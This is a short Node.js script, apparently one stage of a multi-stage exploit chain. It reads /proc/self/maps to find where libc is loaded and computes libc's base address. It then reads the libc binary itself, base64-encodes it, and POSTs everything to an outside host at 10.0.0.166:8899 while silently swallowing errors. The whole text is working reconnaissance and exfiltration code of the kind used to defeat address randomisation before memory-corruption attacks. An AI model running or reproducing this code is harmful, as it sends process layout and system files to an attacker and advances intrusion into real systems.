// Stage-12: get libc base/path and pull libc for symbol offsets.
var fs = require('fs');
var http = require('http');
function post(o) {
  var b = JSON.stringify(o);
  var req = http.request({ host: '10.0.0.166', port: 8899, path: '/recon12', method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(b) } }, function (r) { });
  req.on('error', function (e) { });
  req.write(b); req.end();
}
var out = {};
try {
  var maps = fs.readFileSync('/proc/self/maps', 'utf8').split('\n');
  var libcLine = null;
  for (var i = 0; i < maps.length; i++) { if (/libc-.*\.so|libc\.so\.6/.test(maps[i]) && /r-xp/.test(maps[i])) { libcLine = maps[i]; break; } }
  out.libcLine = libcLine;
  if (libcLine) {
    var base = parseInt(libcLine.split('-')[0], 16);
    var path = libcLine.trim().split(/\s+/).pop();
    out.libcBase = base.toString(16); out.libcPath = path;
    var b = fs.readFileSync(path);
    out.libcB64 = b.toString('base64');
  }
} catch (e) { out.err = e.message; }
post(out);
